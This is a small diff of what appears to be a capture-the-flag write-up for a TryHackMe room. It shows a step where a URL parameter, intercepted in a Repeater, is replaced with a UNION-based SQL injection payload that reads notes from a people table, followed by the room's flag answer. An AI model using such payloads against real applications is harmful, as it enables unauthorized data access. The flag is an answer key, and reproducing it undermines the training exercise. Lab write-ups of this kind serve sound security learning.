@@ -29,3 +29,4 @@ Intercept a request at /about/0 directory and send to Repeater.<br>
 Change the UID or PARAMETER to <b>"0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1"</b> and click Send.<br>
 <img src=https://user-images.githubusercontent.com/78288358/170944815-30864630-6692-4c01-950e-f2680e64e625.png>
 2. Answer: THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}<br><br><br>
+<h1>Continue to Passive Reconnaissance</h1>
